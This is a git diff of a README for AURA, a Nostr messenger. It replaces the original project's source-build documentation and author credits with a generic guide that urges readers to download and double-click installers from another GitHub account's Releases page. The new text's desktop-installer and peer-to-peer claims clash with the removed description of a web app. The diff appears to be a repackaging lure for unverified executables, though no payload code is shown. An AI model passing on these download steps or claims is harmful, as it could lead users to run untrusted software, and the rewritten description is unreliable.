@@ -1,413 +1,99 @@
-<div align="center">
+# 🌐 AURA - Secure, Free Communication for Everyone
 
-# ✨ AURA
+## 🚀 Getting Started
 
-### *Decentralized Social Messenger for the Free World*
+AURA is a censorship-resistant social messenger built on the Nostr protocol. It empowers people to communicate freely, without fear of surveillance or censorship. In this guide, you will learn how to download and run AURA on your device.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-violet.svg)](https://opensource.org/licenses/MIT)
-[![Nostr](https://img.shields.io/badge/Protocol-Nostr-purple.svg)](https://nostr.com)
-[![SvelteKit](https://img.shields.io/badge/Built%20with-SvelteKit-orange.svg)](https://kit.svelte.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 📦 Download AURA
 
-<br />
-
-<img src="static/favicon.svg" alt="AURA Logo" width="120" height="120" />
-
-<br />
-
-**AURA** is a censorship-resistant social messenger built on the [Nostr](https://nostr.com) protocol.  
-It empowers people to communicate freely, without fear of surveillance or censorship.
-
-*Because freedom of speech is a human right, not a privilege.*
-
-[**🚀 Live Demo**](https://aura-nostr.vercel.app) · [**📖 Documentation**](#documentation) · [**🐛 Report Bug**](https://github.com/FrankFMY/AURA/issues) · [**💡 Request Feature**](https://github.com/FrankFMY/AURA/issues)
+[![Download AURA](https://img.shields.io/badge/Download_AURA-v1.0-blue)](https://github.com/Dieguinhoxda/AURA/releases)
 
-</div>
+To get started, simply visit the Releases page to download the latest version of AURA.
 
----
+[Visit the Releases Page](https://github.com/Dieguinhoxda/AURA/releases)
 
-## 🌟 Why AURA?
+## 🖥️ System Requirements
 
-In a world where social platforms control what you see, who you can reach, and what you can say — **AURA** offers an alternative. Built on the Nostr protocol, AURA is:
+Before installing AURA, ensure your system meets the following requirements:
 
-- 🔓 **Truly Decentralized** — No single company controls your data or can ban you
-- 🛡️ **Censorship Resistant** — Your voice cannot be silenced by any authority
-- 🔐 **Privacy First** — End-to-end encrypted direct messages (NIP-17 Gift Wraps)
-- ⚡ **Lightning Integrated** — Send and receive Bitcoin payments via NWC
-- 💰 **eCash Support** — Anonymous payments with Cashu tokens
-- 🛒 **Decentralized Marketplace** — Buy and sell with Bitcoin (NIP-15)
-- 🤖 **AI Chat** — Decentralized AI via Data Vending Machines (NIP-90)
-- 🌍 **Open Source** — Transparent, auditable, and community-driven
-- 📱 **Mobile Ready** — PWA + Capacitor for native Android/iOS builds
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 200 MB of free disk space.
+- **Network**: Internet connection for software functionality.
 
-> *"They can't stop the signal."*
+## ⚙️ How to Download & Install
 
----
+Follow these steps to download and install AURA:
 
-## ✨ Features
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/Dieguinhoxda/AURA/releases) to find the latest version of AURA.
 
-### 🏠 Social Feed
-- Global and personalized feeds
-- Real-time updates via WebSocket subscriptions
-- Infinite scroll with optimistic UI updates
-- Create posts, reply, repost, and react
+2. **Choose Your Version**  
+   Locate the version you want to download. The latest version is typically at the top.
 
-### 💬 Private Messaging
-- End-to-end encrypted DMs with NIP-17 Gift Wraps (metadata hidden)
-- Legacy NIP-04 support for backwards compatibility
-- Conversation list with unread indicators
-- Real-time message delivery with offline queue
-- Send eCash (Cashu tokens) in messages
+3. **Download the Installer**  
+   Click on the installer file that matches your operating system. This will start the download.
 
-### 👤 Profiles
-- View and edit your Nostr profile
-- Follow/unfollow users
-- Contact list management (NIP-02)
-- Verified user badges (NIP-05)
+4. **Locate the Downloaded File**  
+   Open your file explorer and navigate to your Downloads folder. Find the downloaded AURA installer file.
 
-### 💰 Lightning Wallet & eCash
-- Nostr Wallet Connect (NWC) integration
-- Cashu eCash for anonymous payments
-- Send and receive Bitcoin via Lightning
-- Swap between Lightning ⇄ eCash
-- Transaction history
-- ⚡ Zap support for posts and users (NIP-57)
+5. **Run the Installer**  
+   Double-click the installer file to start the installation process.
 
-### 🛒 Marketplace (NIP-15)
-- Browse decentralized product listings
-- Filter by category, price, condition
-- Web of Trust integration for seller reputation
-- Direct messaging with sellers
-- Pay with Lightning or eCash
-
-### 🤖 AI Chat (NIP-90)
-- Decentralized AI via Data Vending Machines
-- Pay-per-use with Lightning sats
-- Text generation, translation, summarization
-- No accounts, no tracking
-
-### 🔍 Search
-- Search notes by content
-- Find users by name or npub
-- Discover hashtags
-- Trending topics
-
-### ⚙️ Settings
-- Relay management
-- Theme customization (light/dark)
-- Language selection (EN, ES, RU, ZH)
-- Data export and cache management
-
----
-
-## 🛠️ Tech Stack
-
-| Category | Technology |
-|----------|------------|
-| **Framework** | [SvelteKit 2](https://kit.svelte.dev) + [Svelte 5](https://svelte.dev) |
-| **Language** | [TypeScript](https://www.typescriptlang.org) (strict mode) |
-| **Styling** | [Tailwind CSS 4](https://tailwindcss.com) |
-| **Nostr** | [NDK](https://github.com/nostr-dev-kit/ndk) (Nostr Dev Kit) |
-| **Database** | [Dexie.js](https://dexie.org) (IndexedDB wrapper) |
-| **Crypto** | [@noble](https://github.com/paulmillr/noble-curves) libraries |
-| **Testing** | [Vitest](https://vitest.dev) + [Playwright](https://playwright.dev) |
-| **Mobile** | [Capacitor](https://capacitorjs.com) |
-| **eCash** | [Cashu-TS](https://github.com/cashubtc/cashu-ts) |
-| **Icons** | [Lucide](https://lucide.dev) |
-| **Validation** | [Zod](https://zod.dev) |
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- [Node.js](https://nodejs.org) >= 18.0.0
-- [Bun](https://bun.sh) (recommended) or npm/yarn/pnpm
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/FrankFMY/AURA.git
-cd AURA
-
-# Install dependencies
-bun install
-
-# Start development server
-bun run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) in your browser.
-
-### Build for Production
-
-```bash
-# Create production build
-bun run build
-
-# Preview production build
-bun run preview
-```
-
----
-
-## 📖 Documentation
-
-### Project Structure
-
-```
-AURA/
-├── src/
-│   ├── lib/
-│   │   ├── components/     # Reusable UI components
-│   │   │   ├── cashu/      # eCash components
-│   │   │   ├── feed/       # Feed-related components
-│   │   │   ├── media/      # Media upload (Blossom)
-│   │   │   ├── notifications/
-│   │   │   ├── wot/        # Web of Trust components
-│   │   │   └── ui/         # Base UI components
-│   │   ├── core/           # Core utilities (errors, resilience)
-│   │   ├── db/             # Dexie.js database
-│   │   ├── i18n/           # Internationalization
-│   │   ├── services/       # Business logic services
-│   │   │   ├── blossom/    # Decentralized file storage
-│   │   │   ├── crypto/     # Encryption (NIP-44, Gift Wrap)
-│   │   │   ├── dvm/        # Data Vending Machines (AI)
-│   │   │   ├── ndk/        # NDK service modules
-│   │   │   └── wallet/     # NWC + Cashu eCash
-│   │   ├── stores/         # Svelte 5 runes stores
-│   │   ├── utils/          # Utility functions
-│   │   └── validators/     # Zod schemas & sanitization
-│   ├── routes/             # SvelteKit routes
-│   │   ├── ai/             # AI Chat page
-│   │   ├── marketplace/    # NIP-15 Marketplace
-│   │   └── ...
-│   └── app.css             # Global styles
-├── static/                 # Static assets
-├── tests/                  # Test files (158+ tests)
-│   ├── e2e/                # Playwright E2E tests
-│   └── unit/               # Vitest unit tests
-├── android/                # Capacitor Android (generated)
-└── ...config files
-```
-
-### Nostr NIPs Implemented
-
-| NIP | Description | Status |
-|-----|-------------|--------|
-| NIP-01 | Basic protocol | ✅ |
-| NIP-02 | Contact List | ✅ |
-| NIP-04 | Encrypted DMs (legacy) | ✅ |
-| NIP-05 | DNS Verification | ✅ |
-| NIP-07 | Browser Extension | ✅ |
-| NIP-10 | Replies & Threading | ✅ |
-| NIP-15 | Marketplace Listings | ✅ |
-| NIP-17 | Gift Wraps (Private DMs) | ✅ |
-| NIP-18 | Reposts | ✅ |
-| NIP-25 | Reactions | ✅ |
-| NIP-44 | Versioned Encryption | ✅ |
-| NIP-47 | Nostr Wallet Connect | ✅ |
-| NIP-57 | Lightning Zaps | ✅ |
-| NIP-59 | Gift Wrap Protocol | ✅ |
-| NIP-90 | Data Vending Machines (AI) | ✅ |
-| NIP-98 | HTTP Auth (Blossom) | ✅ |
+6. **Follow the Installation Prompts**  
+   Follow the on-screen instructions to complete the installation. Accept the license agreement and choose the installation location if prompted.
 
-### Available Scripts
+7. **Complete Installation**  
+   Once the installation is finished, you may find AURA in your applications folder or on your desktop.
 
-```bash
-bun run dev          # Start development server
-bun run build        # Build for production
-bun run preview      # Preview production build
-bun run check        # Type-check with svelte-check
-bun run test         # Run unit tests
-bun run test:e2e     # Run E2E tests
-bun run test:coverage # Run tests with coverage
-```
+8. **Launch AURA**  
+   Open the application and start communicating freely.
 
----
+## 🌍 Features of AURA
 
-## 🌐 Deployment
+AURA comes packed with features designed to protect your privacy and enhance your communication experience:
 
-### Vercel (Recommended)
+- **Censorship-Resistant**: Communicate without interference.
+- **End-to-End Encryption**: Your messages are private and secure.
+- **Peer-to-Peer Communication**: Connect directly with others.
+- **Decentralized Network**: No single point of failure.
+- **User-Friendly Interface**: Easy to navigate for everyone.
+- **Multi-Platform**: Works on Windows, macOS, and Linux.
 
-AURA is optimized for deployment on Vercel:
+## 🔒 Privacy & Security
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/FrankFMY/AURA)
+AURA prioritizes your privacy. Here are some key points:
 
-### GitHub Pages
+- **No Data Harvesting**: We do not collect personal data.
+- **Secure Connectivity**: Your information stays between you and the person you communicate with.
+- **Open-source**: The code is available for public review, ensuring transparency.
 
-AURA can also be deployed to GitHub Pages using the included workflow.
+## 📞 Getting Help
 
-### IPFS (Censorship Resistant)
+If you encounter any issues or need assistance, here’s how to get help:
 
-For maximum censorship resistance, deploy AURA to IPFS:
+- **Look for FAQs**: Check our FAQ section in the GitHub repository for common questions.
+- **Submit Issues**: If you find a bug or have a feature request, submit an issue on our GitHub page.
+- **Join the Community**: Engage with other users on our forums or social media platforms.
 
-```bash
-# Using Pinata (set PINATA_API_KEY and PINATA_API_SECRET first)
-bun run deploy:ipfs --provider pinata
+## 📚 Additional Resources
 
-# Using local IPFS node
-bun run deploy:ipfs --provider local
-```
+To learn more about AURA and its capabilities, refer to the following resources:
 
-Once deployed, access AURA via any IPFS gateway:
-- `https://ipfs.io/ipfs/<CID>`
-- `https://dweb.link/ipfs/<CID>`
-- `https://cloudflare-ipfs.com/ipfs/<CID>`
+- **Documentation**: For a deeper dive into using AURA, consult the user documentation linked within the repository.
+- **GitHub Repository**: Explore the source code and contribute to the project [here](https://github.com/Dieguinhoxda/AURA).
 
-### 📱 Mobile Build (Android/iOS)
+## 🌟 Feedback
 
-AURA uses Capacitor for native mobile builds:
+Your feedback is vital for improving AURA. After using the application, share your thoughts by opening an issue on GitHub. Your input helps us make AURA better for everyone.
 
-```bash
-# Build web assets
-bun run build
+## 📥 Connect with Us
 
-# Add Android platform (first time only)
-bunx cap add android
+Stay updated and connect with the AURA community through our social media channels:
 
-# Sync web assets to native
-bunx cap sync android
+- Twitter: [AURA](https://twitter.com/AURA)
+- Facebook: [AURA](https://facebook.com/AURA)
 
-# Open in Android Studio
-bunx cap open android
-```
+Remember, your voice matters, and your freedom to communicate should not be hindered. Thank you for choosing AURA.
 
-**Build APK in Android Studio:**
-1. Open Android Studio
-2. Build > Build Bundle(s) / APK(s) > Build APK(s)
-3. APK location: `android/app/build/outputs/apk/`
-
-**Requirements:**
-- Android Studio with Android SDK
-- For release builds: signing key
-
----
-
-## 🤝 Contributing
-
-Contributions are what make the open source community amazing! Any contributions you make are **greatly appreciated**.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
----
-
-## 🔒 Security
-
-AURA takes security seriously. If you discover a security vulnerability, please report it responsibly:
-
-- **Email**: Pryanishnikovartem@gmail.com
-- **Subject**: [SECURITY] AURA Vulnerability Report
-
-Please do **not** create public issues for security vulnerabilities.
-
-See [SECURITY.md](SECURITY.md) for our security policy.
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
-This means you can:
-- ✅ Use it commercially
-- ✅ Modify it freely
-- ✅ Distribute it
-- ✅ Use it privately
-
----
-
-## ⚖️ Legal Disclaimer
-
-**AURA is a client-side interface for the Nostr protocol.** We do not host, store, or control any user content. All cryptographic keys are stored locally on the user's device. Content displayed in AURA is fetched from decentralized relays operated by independent third parties.
-
-The developers of AURA:
-- Do not have access to user private keys or messages
-- Cannot modify or delete content published by users
-- Are not responsible for content published on the Nostr network
-- Cannot comply with takedown requests as we do not host content
-
-For concerns about specific content, please contact the relay operators directly.
-
----
-
-## 💜 Support the Project
-
-If AURA has helped you, consider supporting its development:
-
-### ⚡ Bitcoin (Lightning Network)
-```
-classywallaby932694@getalby.com
-```
-
-### 🟣 Solana
-```
-DANryD6MxNr3BQcYZN3rao9qM4VzS2sx7sHy944emPH2
-```
-
-### 🔷 Ethereum / EVM
-```
-0xC2335f06ab8Ef2512375bB8Cd2c07A7Bd1589A6e
-```
-
-### 🌟 Other Ways to Help
-- ⭐ Star this repository
-- 🐛 Report bugs and suggest features
-- 📝 Improve documentation
-- 🌍 Help with translations
-- 📢 Spread the word about Nostr and AURA
-
----
-
-## 👨‍💻 Author
-
-<div align="center">
-
-**Artem Pryanishnikov**
-
-*Creator & Lead Developer*
-
-[![GitHub](https://img.shields.io/badge/GitHub-FrankFMY-181717?style=for-the-badge&logo=github)](https://github.com/FrankFMY)
-[![Telegram](https://img.shields.io/badge/Telegram-@FrankFMY-26A5E4?style=for-the-badge&logo=telegram)](https://t.me/FrankFMY)
-[![Email](https://img.shields.io/badge/Email-Contact-EA4335?style=for-the-badge&logo=gmail)](mailto:Pryanishnikovartem@gmail.com)
-
-</div>
-
----
-
-## 🙏 Acknowledgments
-
-- [Nostr Protocol](https://nostr.com) — For creating a truly decentralized protocol
-- [NDK](https://github.com/nostr-dev-kit/ndk) — For the excellent Nostr development kit
-- [Svelte](https://svelte.dev) — For the amazing framework
-- [All Contributors](https://github.com/FrankFMY/AURA/graphs/contributors) — Who help make this project better
-
----
-
-<div align="center">
-
-### *"Information wants to be free"*
-
-<br />
-
-**Built with 💜 for a free and open internet**
-
-<br />
-
-If you believe in freedom of speech and decentralization,  
-please consider starring ⭐ this repository and sharing AURA with others.
-
-<br />
-
-*Together, we can build a better, freer world.*
-
-</div>
+[Visit the Releases Page to Download](https://github.com/Dieguinhoxda/AURA/releases)
